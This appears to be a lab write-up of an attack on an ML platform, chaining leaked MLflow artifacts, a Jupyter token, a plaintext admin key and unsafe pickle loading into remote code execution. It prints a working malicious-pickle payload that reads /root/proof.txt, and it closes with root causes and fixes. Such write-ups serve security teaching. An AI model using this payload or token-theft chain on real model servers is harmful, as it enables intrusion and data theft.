## Executive Summary
This lab exposed a layered AI platform: MLflow, Jupyter, and a model‑serving API. MLflow artifacts leaked the Jupyter token, granting notebook RCE. A local config file exposed the model‑server admin key. The model server used unsafe pickle loading from a shared volume, enabling RCE on reload and proof extraction.

---

## Attack Chain
1. Identify services (MLflow + Jupyter)
2. Pull MLflow artifacts → Jupyter token
3. Use token to execute code via Jupyter kernel
4. Read local config → model‑server admin key
5. Replace `model.pkl` with malicious pickle
6. Trigger model reload → RCE
7. Exfil `/root/proof.txt`

## Step 5 — Pickle RCE on Model Server
The model server loads `/models/model.pkl`, which is the Jupyter shared volume (`/home/jovyan/shared-models`).

### Malicious pickle (runs on model server)
```python
import pickle, builtins, pathlib, os, shutil

model_path = "/home/jovyan/shared-models/model.pkl"
backup_path = "/home/jovyan/shared-models/model.pkl.bak"

if not os.path.exists(backup_path):
    shutil.copy2(model_path, backup_path)

class RCE(object):
    def __reduce__(self):
        return (builtins.exec, (
            "import pathlib; "
            "pathlib.Path('/models/proof.txt').write_text(" 
            "pathlib.Path('/root/proof.txt').read_text())",
        ))

open(model_path, "wb").write(pickle.dumps(RCE()))
```

## Root Cause
- **Sensitive artifact exposure** in MLflow
- **Jupyter token auth** allowed full notebook execution
- **Local config leak** exposed model‑server admin key
- **Unsafe pickle deserialization** in model server

---

## Security Recommendations
1. Protect MLflow artifacts (auth + RBAC)
2. Use short‑lived Jupyter tokens, no static storage in artifacts
3. Avoid storing admin keys in plaintext on shared volumes
4. Replace pickle loading with safe serialization
5. Run model server with least‑privilege + egress controls
